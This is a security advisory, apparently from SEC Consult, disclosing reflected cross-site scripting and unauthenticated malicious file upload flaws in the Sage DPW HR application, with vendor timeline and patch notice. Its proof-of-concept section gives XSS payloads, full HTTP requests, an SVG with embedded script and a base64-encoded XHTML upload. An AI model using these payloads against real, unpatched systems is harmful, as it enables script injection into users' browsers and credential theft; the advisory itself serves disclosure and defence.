@@ -1,0 +1,176 @@
+id: 35029
+date: 10/12/2020
+title: Sage DPW 2020_06_000 / 2020_06_001 XSS / File Upload Vulnerability
+author: Gerhard Hechenberger
+cves: CVE-2020-26583, CVE-2020-26584
+
+=======================================================================
+              title: Reflected Cross-Site Scripting and Unauthenticated
+                     Malicious File Upload
+            product: Sage DPW
+ vulnerable version: 2020_06_000 & 2020_06_001
+      fixed version: 2020_06_002
+         CVE number: CVE-2020-26583 & CVE-2020-26584
+             impact: high
+           homepage: https://www.sagedpw.at/
+              found: 2020-06
+                 by: Gerhard Hechenberger, Stefan Michlits (Office Vienna)
+                     SEC Consult Vulnerability Lab
+
+                     An integrated part of SEC Consult
+                     Europe | Asia | North America
+
+                     https://www.sec-consult.com
+
+=======================================================================
+
+Vendor description:
+-------------------
+"No matter whether medium-sized company or big brand, whether manufacturing
+industry, service company or social institution, public administration,
+hospital or construction company: We help companies to efficiently organize
+their human resources. Because the success of your company stands and falls
+with the ideas, creativity and knowledge of your employees. With Sage DPW you
+have the right tools for outstanding human resources management."
+
+Source: https://www.sagedpw.at/loesungen/sage-dpw/
+
+
+Business recommendation:
+------------------------
+SEC Consult recommends Sage customers to install the latest updates.
+Furthermore, an in-depth security analysis performed by security professionals
+is highly advised, as the software may be affected from other security issues.
+
+
+Vulnerability overview/description:
+-----------------------------------
+1) Reflected Cross-Site Scripting (CVE-2020-26584)
+The search field "Kurs suchen" on the page "Kurskatalog" is vulnerable to
+Reflected XSS. If an attacker can lure a user into clicking a crafted link,
+the attacker can execute arbitrary JavaScript code in the user's browser. The
+vulnerability can be used to change the contents of the displayed site,
+redirect to other sites or steal user credentials. Additionally, users are
+potential victims of browser exploits and JavaScript malware.
+
+2) Authentication Issues and Insufficient File Upload Restrictions (CVE-2020-26583)
+The application allows users to upload files via the expenses claiming
+functionality. It was identified that an attacker has the possibility to upload
+malicious files without any authentication. However, to view the files,
+authentication is required. By exploiting this vulnerability, an attacker can
+persistently include arbitrary HTML or JavaScript code into the affected web
+page. The vulnerability can be used to perform Cross-Site Scripting attacks.
+
+
+Proof of concept:
+-----------------
+1) Reflected Cross-Site Scripting (CVE-2020-26584)
+To verify this vulnerability, it is sufficient to open the "Kurskatalog" of a
+user and insert the following text into the search:
+<svg/onload=alert(window.location)>
+The browser will issue the following request to the server, containing the
+encoded payload in the vulnerable parameters "suchtext" and "suchtxt":
+--------------------------------------------------------------------------------
+POST /nosso/cgiip.exe/WService=dpw_data/ai1000.htm?dpwr=dpw-000000 HTTP/1.1
+Host: example.com
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 630
+Connection: close
+
+modus=suchliste&art=Kategorie&suche=&suchtext=%3Csvg%2Fonload%3Dalert%28window.location%29%3E
+&liste=&selrowid=&refrowid=&bikatrowid=&apfachrrowid=&apzielgrurowid=&apkursrowid=&bikursrowid=
+&bikatkursrowid=&imenu=Info&anzgoback=7&modusalt=suchliste&myid=0000+007065*&myfnr=99
+&mypnr=999901&myprofile=MA&berMerkliste=0&berFachrichtung=0&berZielgruppe=0&berKategorie=1
+&berNeue_Kurse=0&berOhne_Zuordnung=0&berAntrag_stellen=4&berAntrag_genehmigen=1&berErweiterte_Suche=0
+&berBildungsbedarf=0&berVerwaltung_Kurs=0&berKurskatalog=1&berICalendar=4
+&opener=(r)isterkarte=registerkarte1&suchtxt=%3Csvg%2Fonload%3Dalert%28window.location%29%3E
+--------------------------------------------------------------------------------
+
+2) Authentication Issues and Insufficient File Upload Restrictions (CVE-2020-26583)
+The file upload dialog can be found at "Mitarbeiter" - "Reisekosten" - "Meine
+Reisen". Arbitrary files can be uploaded containing a malicious code that will
+be executed on the client side once a file is opened.
+For this example, the following SVG file was used:
+--------------------------------------------------------------------------------
+<svg xmlns="http://www.w3.org/2000/svg" width="400" height="400">
+<circle id="myCircle" cx="200" cy="200" fill="blue" r="150" />
+<script type="text/javascript">
+alert(document.location);
+</script>
+</svg>
+--------------------------------------------------------------------------------
+After uploading the file, it can be opened via the returned link and its
+embedded JavaScript code is executed. For reading the file, authentication with
+an account using the role "Mitarbeiter" is required, as a valid "dpwr" parameter
+is needed. An unauthenticated upload is also possible. For this, an XHTML file
+was used and uploaded as a base64 string using the following request:
+--------------------------------------------------------------------------------
+POST /nosso/cgiip.exe/WService=dpw_data/p-0820.p HTTP/1.1
+Host: example.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: application/xml, text/xml, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: text/xml
+X-Requested-With: XMLHttpRequest
+Content-Length: 728
+Connection: Keep-Alive
+
+<request action="uploadfile"><data name="data1" value="data:text/html;base64,PGE6c2NyaXB0IHhtbG5zOmE9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGh0bWwiPmFsZXJ0KHdpbmRvdy5sb2NhdGlvbik8L2E6c2NyaXB0Pg=="/>
+  <data name="datacount" value="2"/>
+  <data name="filename" value="SECConsult.xhtml"/>
+  <data name="fileblank" value="no"/>
+  <data name="frameworkpaket" value="Reise"/>
+  <data name="frameworkart" value="Reisebeleg"/>
+  <data name="frameworkrowid" value=""/>
+  <data name="frameworkbesch" value=""/>
+  <data name="frameworkbelnr" value="AUTOMATIK"/>
+  <data name="frameworkpapierart" value=""/>
+  <data name="frameworksecuredata" value=""/>
+  <data name="frameworkben" value="Testperson"/>
+  <data name="frameworkmandant" value=""/>
+</request>
+--------------------------------------------------------------------------------
+The response shows, that the file was accepted and returns a document number and
+a row ID.
+--------------------------------------------------------------------------------
+HTTP/1.1 200 Ok
+Content-Type: text/xml
+Date: Wed, 24 Jun 2020 11:06:03 GMT
+Connection: close
+Content-Length: 198
+
+<?xml version="1.0" ?>
+<response action="uploadfile"><doktype text="pfad"/><doknr checknr="bcdjaImZdkilSeli" checkrowid="0x000000000b4ca212" text="18637"/><besch text="SECConsult.xhtml"/></response>
+--------------------------------------------------------------------------------
+
+
+Vulnerable / tested versions:
+-----------------------------
+The versions 2020_06_000 and 2020_06_001 of Sage DPW were found to be
+vulnerable at the time of testing.
+
+
+Vendor contact timeline:
+------------------------
+2020-07-16: Contacting vendor through info@sagedpw.at
+2020-08-05: Contacting vendor again due to lost message
+2020-08-24: Contacting vendor through kundenservice@sagedpw.at
+2020-08-31: Contacting vendor again due to no response
+2020-09-03: Vendor agreed to proceed without encrypted channel
+2020-09-08: Sent security advisory to vendor
+2020-09-24: Sage informed us that a patch for all vulnerabilities will
+            be released on 2020-09-28
+2020-09-25: The vendor proposed the next possible publication date for the
+            advisory for 2020-10-05. Sage released the patch on 2020-09-25.
+2020-10-12: Public release of security advisory
+
+
+Solution:
+---------
+The vendor provides a patch which should be installed immediately.
+
+#  0day.today [2023-03-23]  #
